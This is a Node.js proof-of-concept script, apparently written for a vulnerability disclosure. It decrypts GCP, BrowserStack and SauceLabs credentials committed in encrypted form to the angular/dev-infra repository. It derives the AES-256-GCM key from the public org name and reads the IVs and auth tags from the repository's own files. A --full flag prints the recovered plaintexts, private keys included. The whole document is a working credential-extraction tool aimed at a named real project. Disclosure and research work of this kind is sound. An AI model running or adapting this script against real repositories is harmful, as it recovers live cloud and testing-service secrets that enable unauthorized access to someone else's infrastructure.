#!/usr/bin/env node
/**
 * F13 PoC — committed credentials in angular/dev-infra composite actions decrypt
 * with public repository material only.
 *
 * Usage:
 *   node decrypt.mjs <path-to-angular-dev-infra-checkout>
 *
 * What it does:
 *   1. Reads the committed constants.ts / action.yml files and the *_token.data
 *      blobs straight out of the checkout. Nothing is hardcoded except the
 *      repository owner name, which is the public org name used to derive the key.
 *   2. Decrypts all three blobs (AES-256-GCM) and prints a sha256 of each
 *      plaintext plus identifying (non-secret) fields.
 *   3. Runs the negative controls: a tampered ciphertext byte, a wrong auth tag,
 *      and a wrong IV must all be rejected by the GCM authentication.
 *
 * Exit code 0 means: all three decrypt with repo material only, and the
 * discriminator rejects everything else. That is the whole claim.
 *
 * The private key and access key values are NOT printed by default. Pass
 * --full to print the recovered plaintexts (they are already public in the
 * repository, but keeping them out of logs is good hygiene).
 */
import {createDecipheriv, createHash} from 'node:crypto';
import {readFileSync, existsSync} from 'node:fs';
import {join} from 'node:path';

const repo = process.argv[2];
const full = process.argv.includes('--full');

if (!repo || !existsSync(join(repo, '.ng-dev'))) {
  console.error('Usage: node decrypt.mjs <path-to-angular-dev-infra-checkout> [--full]');
  process.exit(2);
}

function read(name) {
  return readFileSync(join(repo, name), 'utf8');
}

function constFrom(src, name) {
  // Pull the committed value out of constants.ts, so the PoC proves the
  // material comes from the repo rather than from this script.
  const m = src.match(new RegExp(`export const ${name}\\s*=\\s*'([^']*)'`));
  if (!m) throw new Error(`could not parse ${name} from constants`);
  return m[1];
}

function ngatFrom(actionYml) {
  // The GCM auth tag for browserstack/saucelabs is committed in action.yml as
  // the NGAT env value. Also pulled from the repo, not hardcoded.
  const m = actionYml.match(/NGAT:\s*'([^']+)'/);
  if (!m) throw new Error('could not parse NGAT from action.yml');
  return m[1];
}

function decrypt(dataPath, key, iv, tagB64) {
  const ciphertext = readFileSync(join(repo, dataPath));
  const d = createDecipheriv('aes-256-gcm', key, iv).setAuthTag(Buffer.from(tagB64, 'base64'));
  return Buffer.concat([d.update(ciphertext), d.final()]).toString('utf8');
}

function sha(s) {
  return createHash('sha256').update(s).digest('hex');
}

// The key derivation from the action source: GITHUB_REPOSITORY_OWNER padded to
// 32 bytes. For this repository the owner is the public org name "angular".
const owner = 'angular';
const key = owner.padEnd(32, '<');

const gcpConstants = read('github-actions/bazel/configure-remote/constants.ts');
const scConstants = read('github-actions/saucelabs/constants.ts');
const bsConstants = read('github-actions/browserstack/constants.ts');

const gcpTag = constFrom(gcpConstants, 'at');
const gcpIv = constFrom(gcpConstants, 'iv');
const scIv = constFrom(scConstants, 'iv');
const bsIv = constFrom(bsConstants, 'iv');
const scTag = ngatFrom(read('github-actions/saucelabs/action.yml'));
const bsTag = ngatFrom(read('github-actions/browserstack/action.yml'));

console.log(`key derived from public org name: "${owner}" padded to 32 bytes`);
console.log(`gcp auth tag + iv read from constants.ts: ${gcpTag} / ${gcpIv}`);
console.log(`browserstack/saucelabs tags read from action.yml NGAT, IVs from constants.ts\n`);

const targets = [
  ['gcp', 'github-actions/bazel/configure-remote/gcp_token.data', gcpTag, gcpIv],
  ['browserstack', 'github-actions/browserstack/browserstack_token.data', bsTag, bsIv],
  ['saucelabs', 'github-actions/saucelabs/saucelabs_token.data', scTag, scIv],
];

let ok = true;
for (const [label, path, tag, iv] of targets) {
  try {
    const plain = decrypt(path, key, iv, tag);
    const parsed = JSON.parse(plain);
    const idFields = {};
    for (const f of ['project_id', 'client_email', 'private_key_id', 'SAUCE_USERNAME', 'BROWSER_STACK_USERNAME', 'type']) {
      if (parsed[f] !== undefined) idFields[f] = parsed[f];
    }
    console.log(`[${label}] DECRYPT-OK  sha256=${sha(plain)}  fields=${JSON.stringify(idFields)}`);
    if (full) console.log(`[${label}] full plaintext:\n${plain}\n`);
  } catch (e) {
    console.log(`[${label}] DECRYPT-FAIL ${e.message.slice(0, 80)}`);
    ok = false;
  }
}

// Negative controls: the discriminator must reject anything that is not the
// exact committed material.
console.log('\nnegative controls:');
const gcpCipher = readFileSync(join(repo, 'github-actions/bazel/configure-remote/gcp_token.data'));
const tampered = Buffer.from(gcpCipher);
tampered[10] ^= 0xff;

const attempts = [
  ['tampered ciphertext byte', tampered, gcpTag, gcpIv],
  ['wrong auth tag', gcpCipher, Buffer.alloc(12, 0).toString('base64'), gcpIv],
  ['wrong iv', gcpCipher, gcpTag, '104149904141653713'],
];
for (const [label, ct, tag, iv] of attempts) {
  try {
    const d = createDecipheriv('aes-256-gcm', key, iv).setAuthTag(Buffer.from(tag, 'base64'));
    Buffer.concat([d.update(ct), d.final()]);
    console.log(`  ${label}: ACCEPTED (unexpected)`);
    ok = false;
  } catch {
    console.log(`  ${label}: rejected as expected`);
  }
}

console.log(ok ? '\nRESULT: PASS — repo material alone decrypts all three credentials; controls reject everything else.'
               : '\nRESULT: FAIL');
process.exit(ok ? 0 : 1);
